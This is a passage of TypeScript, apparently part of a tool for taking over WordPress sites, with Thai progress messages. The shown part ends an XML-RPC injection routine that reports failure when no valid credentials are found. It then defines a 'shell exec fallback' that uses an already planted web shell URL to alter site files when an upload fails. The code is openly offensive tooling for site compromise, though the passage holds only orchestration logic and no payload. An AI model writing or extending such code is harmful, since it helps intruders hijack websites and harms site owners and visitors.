        if (xmlrpcResult.success) {
          results.push(xmlrpcResult);
          return results;
        }
      }
    }
    results.push({
      method: "xmlrpc_inject",
      success: false,
      detail: "XMLRPC injection ล้มเหลว — ไม่มี credentials ที่ถูกต้อง",
    });
  }

  return results;
}

// ═══════════════════════════════════════════════════════
//  SHELL EXEC FALLBACK (when we have a shell URL but upload failed)
// ═══════════════════════════════════════════════════════

export async function runShellExecFallback(config: WpAdminConfig, shellUrl: string): Promise<WpTakeoverResult[]> {
  const results: WpTakeoverResult[] = [];
  const progress = config.onProgress || (() => {});

  progress("shell_exec", "⚡ Shell Exec Fallback — ใช้ shell ที่มีอยู่แก้ไฟล์แทน upload...");

  const result = await injectViaShellExec(config, shellUrl);
  results.push(result);

  return results;
}
